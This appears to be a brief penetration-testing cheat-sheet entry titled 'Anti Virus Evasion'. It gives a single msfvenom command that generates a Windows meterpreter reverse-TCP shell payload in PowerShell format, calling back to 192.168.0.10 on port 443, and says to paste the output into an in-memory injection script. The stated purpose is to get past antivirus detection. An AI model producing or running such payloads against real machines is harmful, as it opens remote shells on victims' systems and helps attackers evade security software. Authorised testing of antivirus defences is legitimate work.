# Anti Virus Evasion

Generate a malicious payload for testing with AV:
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=443 -f powershell`

Add the output to  `in_memory_injection.ps1`.



